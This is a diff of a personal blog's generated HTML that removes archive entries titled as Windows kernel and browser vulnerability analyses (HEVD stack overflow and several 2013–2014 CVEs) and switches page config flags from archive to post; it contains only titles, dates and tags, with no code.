-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/10/22/HEVD%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-1-%E5%86%85%E6%A0%B8%E6%A0%88%E6%BA%A2%E5%87%BA/" class="archive-article-date">
-  	<time datetime="2020-10-22T05:55:47.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-10-22</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/10/22/HEVD%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-1-%E5%86%85%E6%A0%B8%E6%A0%88%E6%BA%A2%E5%87%BA/">HEVD内核漏洞学习(1)-内核栈溢出</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">HEVD内核</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/10/19/CVE-2014-4113win32k-sys%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/CVE-2014-4113win32k-sys%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="archive-article-date">
-  	<time datetime="2020-10-19T08:01:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-10-19</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/10/19/CVE-2014-4113win32k-sys%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/CVE-2014-4113win32k-sys%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">CVE-2014-4113win32k.sys内核漏洞分析</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">漏洞分析</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/10/11/CVE-2014-1767WindowsAFD-sys%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="archive-article-date">
-  	<time datetime="2020-10-11T03:01:15.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-10-11</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/10/11/CVE-2014-1767WindowsAFD-sys%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">CVE-2014-1767WindowsAFD.sys内核漏洞分析</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">漏洞分析</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/10/08/CVE-2013-1347UAF%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="archive-article-date">
-  	<time datetime="2020-10-08T01:00:48.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-10-08</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/10/08/CVE-2013-1347UAF%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">CVE-2013-1347UAF漏洞分析</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">漏洞分析</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/10/04/CVE-2013-2551%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="archive-article-date">
-  	<time datetime="2020-10-04T01:22:26.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-10-04</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/10/04/CVE-2013-2551%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">CVE-2013-2551整数溢出漏洞分析</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">漏洞分析</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
-  
-
-    
-    <nav id="page-nav">
-      <span class="page-number current">1</span><a class="page-number" href="/archives/page/2/">2</a><a class="extend next" rel="next" href="/archives/page/2/">Next &amp;raquo;</a>
-    </nav>
   
 
 
@@ -546,8 +261,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
